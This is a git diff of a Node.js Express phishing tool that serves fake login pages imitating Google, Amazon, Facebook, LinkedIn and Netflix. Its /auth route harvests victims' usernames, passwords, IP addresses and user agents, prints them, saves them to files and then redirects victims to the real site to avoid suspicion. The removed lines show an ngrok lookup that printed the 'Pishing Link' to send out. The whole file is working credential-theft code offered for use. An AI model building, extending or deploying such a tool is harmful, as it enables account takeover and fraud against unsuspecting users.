@@ -1,20 +1,23 @@
+console.clear()
 // libs
 const express = require('express')
 const fs = require('fs')
+const path = require('path')
 const session = require('express-session')
 const bodyParser = require('body-parser')
-const path = require('path')
-const Table = require('cli-table')
 const readline = require('readline-sync')
-const { exit } = require('process')
-const fakepass = require('./pass/pased.json')
-const fetch = require('node-fetch')
-const Bluebird = require('bluebird');
+const Table = require('cli-table')
+const Info = []
+const fakepass = require('./redirect.json')
+// def
+const app = express()
+me = new Table()
+info = new Table()
 
-// ist
-fetch.Promise = Bluebird
-const recived = new Table()
-const me = new Table()
+// scripts
+const getAgent = require('./scripts/getAgent.js')
+const getIp = require('./scripts/getIp.js')
+const getLink = require('./scripts/getLink.js')
 
 // colors
 vermelho = '\033[31m'
@@ -28,31 +31,21 @@ preto = '\033[30m'
 r = '\033[0;0m'
 negrito = '\033[1m'
 
+// template
+console.log('Chose template:')
 
-// get link ngrok
-async function most_link(){
-    await fetch('http://127.0.0.1:4040/api/tunnels')
-    .then(data => data.json())
-    .then(body => console.log(`${vermelho}Pishing${r} Link:${vermelho} ${body['tunnels'][0]['public_url']}${amarelo}\nAwait...${r}`))
-}
-
-// input and output
-console.clear()
-console.log('')
-
-console.log(`${magenta}CHOOSE${r} A ${verde}TEMPLATE${r} FOR ${vermelho}PHISHING:${verde}`)
 sites = ['Google', 'Amazon', 'Facebook', 'Linkedin', 'Netflix']
 index = readline.keyInSelect(sites, `${magenta}[Set]${r}`)
-var siteEscolido = sites[index] 
 
-if (siteEscolido == undefined){
+const site = sites[index]
+
+if (sites == undefined){
     console.log(`${vermelho}#${negrito} Aborted.${r}`)
     exit()
 
 }
 
-// app 
-var app = express()
+// app config
 app.use(session({
 	secret: 'secret',
 	resave: true,
@@ -62,71 +55,77 @@ app.use(session({
 app.use(bodyParser.urlencoded({extended : true}))
 app.use(bodyParser.json())
 
-// servir template
-app.get('/', function(request, response) {
-	response.sendFile(path.join(__dirname + `/pages/${siteEscolido}/index.html`))
+// routes
+app.get('/', (req, res) => {
+
+  // send template
+  res.sendFile(path.join(__dirname + `/pages/${site}/index.html`))
+
+  // geting ip and user agent
+  let ip = getIp(req)
+  let agent = getAgent(req)
+
+  // printing...
+  Info.ip = ip
+  Info.agent = agent
 })
+app.post('/auth', (req, res)=>{
+  var user = req.body.user
+  var pwd = req.body.pwd
+  Info.user = user
+  Info.pass = pwd
 
+  info.push(
+    {"Ip":Info.ip},
+    {"Agent":Info.agent},
+    {"Login":Info.user},
+    {"Pass":Info.pass}
+  )
+  console.log(info.toString())
 
-// rota do pishing
-app.post('/auth', function(request, response) {
-	var user = request.body.user
-	var pwd = request.body.pwd
-
-    fs.writeFile(`captured/${user}.user.json`, `
+  fs.writeFile(`captured/${Info.user}.user.json`, `
 {
-        "username":"${user}",
-        "pass":"${pwd}"
+      "username":"${Info.user}",
+      "pass":"${Info.pwd}",
+      "Ip":"${Info.ip}",
+      "User-Agent":"${Info.agent}"
 }`, (err, data)=>{
 
-    
+
     })
 
-	recived.push(
-		{"User":"Pass"}
-		,{user:pwd}
-	)
-    console.log(recived.toString())
-    // fake pass...
-    if (siteEscolido == 'Google'){
-        response.redirect(fakepass.Google)
-        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)
 
-    } if (siteEscolido == 'Facebook'){
-        response.redirect(fakepass.Facebook)
-        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)
+  // redirect user
+  if (site == 'Google'){
+      res.redirect(fakepass.Google)
+      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)
 
-    } if (siteEscolido == 'Amazon'){
-        response.redirect(fakepass.Amazon)
-        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)
+  } if (site == 'Facebook'){
+      res.redirect(fakepass.Facebook)
+      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)
 
-    } if (siteEscolido == 'Linkedin'){
-        response.redirect(fakepass.Linkedin)
-        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)
+  } if (site == 'Amazon'){
+      res.redirect(fakepass.Amazon)
+      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)
 
-    } if (siteEscolido == 'Netflix'){
-        response.redirect(fakepass.Netflix)
-        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)
+  } if (site == 'Linkedin'){
+      res.redirect(fakepass.Linkedin)
+      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)
 
-    }
+  } if (site == 'Netflix'){
+      res.redirect(fakepass.Netflix)
+      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)
+
+  }
 })
 
-
-// rota que mostra os dados do pishing
-app.get('/vw/:user', (req, res)=> {
-    res.sendFile(path.join(__dirname + `/captured/${req.params.user}.user.json`))
-})
-
-
-// init server
-app.listen(1337, ()=> {
-    console.clear()
-    me.push(
-    	{"Template":siteEscolido}
-    	,{"Author":"Gab"}
-    	,{"Github:":" https://github.com/gabhm"}
-    )
-	console.log(me.toString())
-    console.log(`${amarelo}WARNING ${negrito} TO ${vermelho}CLOSE${verde}${negrito} THE SERVER, TYPE: CTRL + C !!${r}`)
-    most_link()
+// start server
+app.listen(1337, ()=>{
+  console.clear()
+  me.push(
+    {"Template":site}
+    ,{"Author":"Gab"}
+    ,{"Github:":" https://github.com/gabhm"}
+  )
+  console.log(me.toString())
 })
